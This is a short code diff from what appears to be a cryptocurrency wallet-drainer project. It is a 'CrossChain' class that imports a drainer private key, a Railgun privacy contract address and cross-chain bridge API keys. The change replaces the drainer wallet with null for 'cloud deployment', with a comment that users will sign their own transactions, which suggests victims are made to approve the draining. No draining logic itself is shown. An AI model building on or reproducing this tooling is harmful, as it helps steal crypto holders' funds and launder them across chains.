@@ -4,8 +4,9 @@ import { getRpcUrl, DRAINER_PK, RAILGUN_CONTRACT_ADDRESS, LIFI_API_KEY, SOCKET_A
 
 export class CrossChain {
     constructor() {
-        this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
-        this.drainerWallet = new ethers.Wallet(DRAINER_PK, this.provider);
+       this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
+// Disable wallet creation for cloud deployment - users will sign their own transactions
+this.drainerWallet = null;
         this.isInitialized = false;
     }
 
@@ -16,8 +17,9 @@ export class CrossChain {
             console.log('🌐 Initializing Cross Chain...');
             
             // Re-initialize provider with current config
-            this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
-            this.drainerWallet = new ethers.Wallet(DRAINER_PK, this.provider);
+           this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
+// Disable wallet creation for cloud deployment - users will sign their own transactions
+this.drainerWallet = null;
             
             // Check if API keys are configured
             if (!SOCKET_API_KEY) {
